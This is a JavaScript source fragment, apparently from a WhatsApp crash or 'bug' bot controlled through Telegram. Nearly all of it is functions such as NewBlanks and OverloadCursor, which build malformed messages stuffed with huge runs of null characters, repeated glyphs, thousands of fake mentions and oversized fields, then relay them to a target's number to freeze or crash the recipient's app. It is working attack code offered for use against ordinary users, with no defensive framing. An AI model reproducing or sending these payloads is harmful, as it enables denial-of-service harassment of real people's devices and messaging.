    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
    mediaKeyTimestamp: "1715880173",
    contactVcard: true
},
title: "",
hasMediaAttachment: true
    },
    body: {
text: AsepNotDev
    },
    nativeFlowMessage: {},
    contextInfo: {
mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
    }
}
    }
}
    }, { participant: { jid: target } }, { messageId: null });
}

async function NewBlanks(target) {
  try {
    const ThumbRavage = "https://files.catbox.moe/cfkh9x.jpg";
    const imagePayload = await prepareWAMessageMedia({
      image: { url: ThumbRavage, gifPlayback: true }
    }, {
      upload: client.waUploadToServer,
      mediaType: "image"
    });
    const msg = generateWAMessageFromContent(target, proto.Message.fromObject({
      interactiveMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 30000 }, () =>
            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
          ),
          isForwarded: true,
          forwardingScore: 9999,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363331859075083@newsletter",
            newsletterName: "ꦾ".repeat(10000),
            serverMessageId: 1
          }
        },
        header: {
          title: " M͉̅ͮ͒ͤA̷͙ͭͫ̕R͉̜̎͡͠C̵͉͋̔͞V̘̪͆̂̅A̷͙ͭͫ̕L̸̖̽̌͂K͕͓͌̎̾Ỵ̛̖͋͢R͉̜̎͡͠I̍̅̀̎̊O̖̼ͩ͌͐N̺̻̔̆ͅ",
          ...imagePayload,
          hasMediaAttachment: true
        },
        body: {
          text: "\u2063".repeat(10000)
        },
        footer: {
          text: ""
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "ꦾ".repeat(10000),
                url: "ꦾ".repeat(10000),
                merchant_url: ""
              })
            },
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                "screen_1_TextInput_0": "radio" + "\0".repeat(10000),
                "screen_0_Dropdown_1": "Null",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }),
              version: 3
            }
          ]
        }
      }
    }), { quoted: null });
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id});
    console.log(`TravasBlank Delay Send To ${target}`);
  } catch (err) {
    console.error("Error in BlankScreen:", err);
  }
}

async function OverloadCursor(target, ptcp = true) {
  const virtex = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];
  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title:
            "υтιη¢яαѕн" + "ꦽ".repeat(16999),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "😹",
          },
          contextInfo: {
            virtexId: zephy.generateMessageTag(),
            participant: "13135550002@s.whatsapp.net",
            mentionedJid: ["13135550002@s.whatsapp.net"],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "Z?" + "\u0000".repeat(97770),
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath:
                    "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: tdxlol,
                },
                hasMediaAttachment: true,
                contentText: 'ctxutin"👋"',
                footerText: "|| VCS BY UTIN ꦽ",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(170000),
                    buttonText: {
                      displayText: "Ampas?" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "Ampas?" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "Ampas?" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                ],
                viewOnce: true,
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: tdxlol,
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "13135550002@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "❤️",
            entryPointConversionApp: "💛",
            actionLink: {
              url: "t.me/ambabug",
              buttonTitle: "Ampas",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "😼",
            parentGroupJid: "😽",
            trustBannerType: "😾",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {},
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `@13135550002${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "@13135550002".repeat(2999),
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };
  let sections = [];
  for (let i = 0; i < 1; i++) {
    let largeText = "\u0000".repeat(11999);
    let deepNested = {
      title: `Section ${i + 1}`,
      highlight_label: `Highlight ${i + 1}`,
      rows: [
        {
          title: largeText,
          id: `\u0000`.repeat(999),
          subrows: [
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
              subsubrows: [
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
              ],
            },
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
            },
          ],
        },
      ],
    };
    sections.push(deepNested);
  }
  let listMessage = {
    title: "𝙾𝚅𝙴𝚁𝙻𝙾𝙰𝙳",
    sections: sections,
  };
  let msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
            },
            body: proto.Message.InteractiveMessage.Body.create({
              text: 'Woi Ada Utin Ga!!' + "ꦽ".repeat(29999),
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              buttonParamsJson: JSON.stringify(listMessage),
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              buttonParamsJson: JSON.stringify(listMessage),
              subtitle: "utin crash" + "\u0000".repeat(9999),
              hasMediaAttachment: false,
            }),
            nativeFlowMessage:
              proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)"
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{}",
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              }),
          }),
        },
      },
    }),
    { userJid: target }
  );
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  console.log(`𝚂𝚄𝙲𝙲𝙴𝚂 𝚂𝙴𝙽𝙳 𝙿𝙰𝚈𝙻𝙾𝙰𝙳 𝙱𝚄𝚃𝚃𝙾𝙽 𝚃𝙾 ${target}`);
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  await sock.relayMessage(target, messagePayload, {
    additionalNodes: virtex,
    participant: { jid: target },
  });
  console.log(`𝚂𝚄𝙲𝙲𝙴𝚂 𝚂𝙴𝙽𝙳 𝙿𝙰𝚈𝙻𝙾𝙰𝙳 𝙲𝚄𝚁𝚂𝙾𝚁 𝚃𝙾 ${target}`);
}
// ------------ ( END FUNCTION BUGS ) -------------- \\

// --- Jalankan Bot ---

(async () => {
  console.log("🚀 Memulai sesi WhatsApp...");
  startSesi();
  console.log("Succes Connected 🕷️");
  bot.launch();
})();
